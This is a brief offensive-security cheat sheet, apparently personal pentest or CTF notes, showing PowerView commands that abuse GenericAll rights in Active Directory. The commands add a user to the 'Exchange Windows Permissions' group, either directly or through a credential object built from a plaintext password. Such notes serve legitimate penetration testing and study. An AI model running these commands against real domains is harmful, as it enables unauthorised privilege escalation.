---
title: "GenericAll"
date: 2024-7-12
tags: ["GenericAll", "active driectory", "ad", "Windows"]
---

---
### Using PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### Authenticated

```powershell
# Add user to group (e.g. Exchange Windows Permissions)
Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members USER
```

#### Runas

```powershell
$username = "domain\username"
```

```powershell
$password = "password"
```

```powershell
$secstr = New-Object -TypeName System.Security.SecureString
```

```powershell
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
```

```powershell
# Add user to group (e.g. Exchange Windows Permissions)
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members USER -Credential $Cred
```

<br>